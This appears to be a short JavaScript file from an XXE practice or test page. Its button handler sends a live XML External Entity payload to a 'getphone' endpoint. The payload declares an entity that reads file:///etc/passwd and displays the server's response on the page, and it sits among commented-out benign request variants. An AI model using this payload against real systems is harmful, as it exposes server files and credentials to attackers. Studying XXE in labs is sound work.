$("#btn").click(function() {
	var user = document.getElementById("name").value;
	// var xmlHTTP = new XMLHttpRequest();	
	 console.log("xxe js send");
	// xmlHTTP.open("POST","getphone",true);
 //    xmlHTTP.setRequestHeader("Content-type","text/xml; charset=UTF-8");
 //    xmlHTTP.send("<reset><secret>"+user+"</secret></reset>");

    // var data = {
    // 	"string":'<?xml version="1.0" encoding="UTF-8"?><fetchdata><random>abcd</random><username>'+user+'</username></fetchdata>'
    // }

    var data = {
    	"string":'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><fetchdata><random>abcd</random><username>&xxe;</username></fetchdata>'
    }

    console.log("data.string= "+data);

    $.post("getphone", data)
    	.done(function(result) {
    		console.log("result = "+result);
    		//document.getElementById("res1").append(result.message[0].phone);
    		document.getElementById("res1").append(result);
    	})

    	// $.ajax({
    	// 	url: "getphone",
    	// 	type: "POST",
    	// 	data: data.string,
    	// 	contentType: window.contentType,
    	// 	success: function(result) {
    	// 		console.log("result = "+result);
    	// 	},
    	// 	error: function(error) {
    	// 		console.log("error = "+error);
    	// 	}   		
    	// })

    	// fetch(
    	// 	"getphone",
    	// 	{
    	// 		method: "POST",
    	// 		body: data
    	// 	}
    	// ).then(
    	// 		res => console.log(res)
    	// 	);
    	
});